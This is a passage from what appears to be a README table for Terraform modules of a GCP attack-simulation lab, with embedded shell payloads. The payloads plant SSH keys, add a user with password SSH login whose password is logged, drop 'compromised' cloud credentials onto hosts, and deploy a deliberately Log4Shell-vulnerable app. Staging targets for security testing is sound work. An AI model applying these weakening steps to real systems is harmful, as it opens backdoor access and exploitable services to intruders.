$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125;:$&&#35;123;local&#46;public&&#35;95;key&&#35;95;user&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;<br/>    log &quot;public key: $&&#35;40;ls &#45;l $&&#35;123;local&#46;ssh&&#35;95;public&&#35;95;key&&#35;95;path&&#35;125;&&#35;41;&quot;<br/>    log &quot;authorized key: $&&#35;40;ls &#45;l $&&#35;123;local&#46;ssh&&#35;95;authorized&&#35;95;keys&&#35;95;path&&#35;125;&&#35;41;&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&&#35;95;payload&&#35;95;public = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;public&&#35;95;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload&&#35;95;public<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    payload&&#35;95;private = &lt;&lt;&#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating private key: $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;&quot;<br/>    log &quot;adding user: $&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125;&#46;&#46;&#46;&quot;<br/>    adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password &quot;$&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125;&quot; &#124;&#124; log &quot;$&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125; user already exists&quot;<br/>    mkdir &#45;p $&&#35;123;dirname&&#35;40;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;41;&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;41;&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;<br/>    chmod 600 $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;<br/>    chown $&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125;:$&&#35;123;local&#46;private&&#35;95;key&&#35;95;user&&#35;125; $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;<br/>    log &quot;private key: $&&#35;40;ls &#45;l $&&#35;123;local&#46;ssh&&#35;95;private&&#35;95;key&&#35;95;path&&#35;125;&&#35;41;&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64&&#35;95;payload&&#35;95;private = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;private&&#35;95;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload&&#35;95;private<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload&&#35;95;public = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;public&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;public = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;public&&#35;41;<br/>        base64&&#35;95;payload&&#35;95;private = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;private&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;private = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;95;private&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| target-ssh-user                                         | ./modules/osconfig/deploy-ssh-user                    | osconfig_deploy_ssh_user                        | context.gcp.osconfig.ssh_user                                    | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "ssh_user": {<br/>                    "enabled": false,<br/>                    "password": null,<br/>                    "username": "lou.caloozer"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-user                    | <pre>locals &&#35;123;<br/>    password = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;password&quot;&&#35;93;&&#35;41;,&quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;password&quot;&&#35;93; :  random&&#35;95;password&#46;password&#46;result<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;Setting up user: $&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125;&quot;<br/>    adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password $&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125; &#124;&#124; log &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125; user already exists&quot;<br/>    log &quot;Setting passwd: $&&#35;123;local&#46;password&&#35;125;&quot;<br/>    echo &&#35;x27;$&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125;:$&&#35;123;local&#46;password&&#35;125;&&#35;x27; &#124; chpasswd<br/>    log &quot;Adding user to allowed passwd auth in sshd&&#35;95;config&#46;d&quot;<br/>    cat &gt; /etc/ssh/sshd&&#35;95;config&#46;d/common&#45;user&#45;passwd&#45;auth&#46;conf &lt;&lt;&#45;EOF <br/>    &#35; Configuration to allow key authentication only and display a message on password attempt<br/>    Match User root,admin,test,guest,info,adm,mysql,user,administrator,oracle,ftp,pi,puppet,ansible,ec2&#45;user,vagrant<br/>        AuthenticationMethods publickey<br/>        PasswordAuthentication no<br/>        ForceCommand /bin/echo &&#35;x27;We talked about this guys&#46; No SSH for you&#33;&&#35;x27;<br/>    EOF<br/>    cat &gt; /etc/ssh/sshd&&#35;95;config&#46;d/custom&#45;user&#45;passwd&#45;auth&#46;conf &lt;&lt;&#45;EOF <br/>    Match User $&&#35;123;var&#46;inputs&&#35;91;&quot;username&quot;&&#35;93;&&#35;125;<br/>        AuthenticationMethods publickey password<br/>        PasswordAuthentication yes<br/>    EOF<br/>    log &quot;Restarting ssh service&quot;<br/>    service ssh reload<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>        password = local&#46;password<br/>    &&#35;125;<br/>&&#35;125;<br/><br/>resource &quot;random&&#35;95;password&quot; &quot;password&quot; &&#35;123;<br/>  length           = 16<br/>  special          = true<br/>  override&&#35;95;special = &quot;&#33;&#35;$%&amp;&&#35;42;&&#35;40;&&#35;41;&#45;&&#35;95;=&#43;&&#35;91;&&#35;93;&&#35;123;&&#35;125;&lt;&gt;:?&quot;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| target-gcp-credentials                                  | ./modules/osconfig/deploy-gcp-credentials             | osconfig_deploy_secret_gcp_credentials          | context.gcp.osconfig.gcp_credentials                             | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "gcp_credentials": {<br/>                    "compromised_keys_user": null,<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-gcp-credentials             | <pre>locals &&#35;123;<br/>    tool = &quot;gcloud&quot;<br/>    gcp&&#35;95;creds = var&#46;inputs&&#35;91;&quot;compromised&&#35;95;credentials&quot;&&#35;93;&&#35;91;var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;&&#35;93;&#46;rendered<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Deploying gcp credentials&#46;&#46;&#46;&quot;<br/>    mkdir &#45;p ~/&#46;config/gcloud<br/>    if &&#35;91;  &quot;$&&#35;123; local&#46;gcp&&#35;95;creds == &quot;&quot; ? &quot;false&quot; : &quot;true&quot; &&#35;125;&quot; == &quot;true&quot; &&#35;93;; then<br/>      echo $&&#35;123;base64gzip&&#35;40;local&#46;gcp&&#35;95;creds&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; ~/&#46;config/gcloud/credentials&#46;json<br/>      gcloud auth activate&#45;service&#45;account &#45;&#45;key&#45;file=~/&#46;config/gcloud/credentials&#46;json<br/>    fi<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found &#45; waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found &#45; waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| target-vulnerable-docker-log4j-app                      | ./modules/osconfig/deploy-docker-log4j-app            | osconfig_deploy_docker_log4j_app                | context.gcp.osconfig.vulnerable.docker.log4j_app                 | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "vulnerable": {<br/>                    "docker": {<br/>                        "log4j_app": {<br/>                            "enabled": false,<br/>                            "listen_port": 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker-log4j-app            | <pre>locals &&#35;123;<br/>    image = &quot;ghcr&#46;io/christophetd/log4shell&#45;vulnerable&#45;app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929&quot;<br/>    name = &quot;log4shell&quot;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        if &&#35;91;&&#35;91; &&#35;96;sudo docker ps &#124; grep $&&#35;123;local&#46;name&&#35;125;&&#35;96; &&#35;93;&&#35;93;; then docker stop $&&#35;123;local&#46;name&&#35;125;; fi<br/>        log &quot;$&&#35;40;echo &&#35;x27;docker run &#45;d &#45;&#45;name $&&#35;123;local&#46;name&&#35;125; &#45;v /tmp:/tmp &#45;&#45;rm &#45;p $&&#35;123;local&#46;listen&&#35;95;port&&#35;125;:8080 $&&#35;123;local&#46;image&&#35;125;&&#35;x27;&&#35;41;&quot;<br/>        docker run &#45;d &#45;&#45;name $&&#35;123;local&#46;name&&#35;125; &#45;v /tmp:/tmp &#45;&#45;rm &#45;p $&&#35;123;local&#46;listen&&#35;95;port&&#35;125;:8080 $&&#35;123;local&#46;image&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        docker ps &#45;a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;curl&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;curl&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| target-vulnerable-log4j-app                             | ./modules/osconfig/deploy-log4j-app                   | osconfig_deploy_log4j_app                       | context.gcp.osconfig.vulnerable.log4j_app                        | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "vulnerable": {<br/>                    "log4j_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8080<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-log4j-app                   | <pre>locals &&#35;123;<br/>    app&&#35;95;dir = &quot;/vuln&#45;log4j&#45;app&quot;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;X quit<br/>    screen &#45;wipe<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;log4j&&#35;95;app&&#35;95;target&#46;log<br/>    <br/>    rm &#45;rf $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/>    mkdir $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/><br/>    log &quot;creating local files&#46;&#46;&#46;&quot;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;web&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; web&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;ldap&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip  &gt; ldap&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;requirements&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; requirements&#46;txt<br/><br/>    &#35; install java 8u131<br/>    log &quot;checking for jdk1&#46;8&#46;0&&#35;95;131&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &#33; &#45;d /usr/java/jdk1&#46;8&#46;0&&#35;95;131/ &&#35;93;; then<br/>        log &quot;jdk1&#46;8&#46;0&&#35;95;131 not found &#45; installing&#46;&#46;&#46;&quot;<br/>        wget &#45;c &#45;&#45;header &quot;Cookie: oraclelicense=accept&#45;securebackup&#45;cookie&quot; http://download&#46;oracle&#46;com/otn&#45;pub/java/jdk/8u131&#45;b11/d54c1d3a095b4ff2b6607d096fa80163/jdk&#45;8u131&#45;linux&#45;x64&#46;tar&#46;gz<br/>        mkdir &#45;p /usr/java<br/>        sudo tar &#45;xvzf jdk&#45;8u131&#45;linux&#45;x64&#46;tar&#46;gz &#45;C /usr/java<br/>    else<br/>        log &quot;jdk1&#46;8&#46;0&&#35;95;131 found &#45; skipping install&quot;<br/>    fi<br/>    <br/><br/>    &#35; update java path<br/>    log &quot;setting up java environment for build&#46;&#46;&#46;&quot;<br/>    export JAVA&&#35;95;HOME=/usr/java/jdk1&#46;8&#46;0&&#35;95;131/<br/>    sudo update&#45;alternatives &#45;&#45;install /usr/bin/java java $$&&#35;123;JAVA&&#35;95;HOME%&&#35;42;/&&#35;125;/bin/java 20000<br/>    sudo update&#45;alternatives &#45;&#45;install /usr/bin/javac javac $$&&#35;123;JAVA&&#35;95;HOME%&&#35;42;/&&#35;125;/bin/javac 20000<br/>    <br/>    java &#45;version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &#35; download gradle 7&#46;3&#46;1<br/>    log &quot;checking for gradle 7&#46;3&#46;1&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &#33; &#45;d /opt/gradle/gradle&#45;7&#46;3&#46;1 &&#35;93;; then<br/>        log &quot;gradle not found &#45; installing&#46;&#46;&#46;&quot;<br/>        wget https://services&#46;gradle&#46;org/distributions/gradle&#45;7&#46;3&#46;1&#45;bin&#46;zip<br/>        mkdir /opt/gradle<br/>        unzip &#45;d /opt/gradle gradle&#45;7&#46;3&#46;1&#45;bin&#46;zip<br/>    else<br/>        log &quot;gradle 7&#46;3&#46;1 found &#45; skipping install&quot; <br/>    fi<br/><br/>    &#35; update gradle path<br/>    log &quot;updating environment PATH to include gradle&#46;&#46;&#46;&quot;<br/>    export PATH=$PATH:/opt/gradle/gradle&#45;7&#46;3&#46;1/bin<br/>    gradle &#45;&#45;version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &#35; clone the log4shell vulnerable app<br/>    log &quot;cloning https://github&#46;com/christophetd/log4shell&#45;vulnerable&#45;app&#46;&#46;&#46;&quot;<br/>    git clone https://github&#46;com/christophetd/log4shell&#45;vulnerable&#45;app<br/>    cd log4shell&#45;vulnerable&#45;app<br/>    log &quot;running gradle build&#46;&#46;&#46;&quot;<br/>    nohup gradle bootJar &#45;&#45;no&#45;daemon &amp;<br/>    GRADLE&&#35;95;PID=$&#33;<br/>    while kill &#45;0 $GRADLE&&#35;95;PID 2&gt; /dev/null; do<br/>        log &quot;Process is still running&#46;&#46;&#46;&quot;<br/>        sleep 30<br/>    done<br/>    log &quot;gradle build complete&#46;&quot;<br/>    <br/>    ls &#45;ltr build/libs/&&#35;42;&#46;jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &#35; copy java jar<br/>    log &quot;Copying java jar&#46;&#46;&quot;<br/>    cp build/libs/log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar 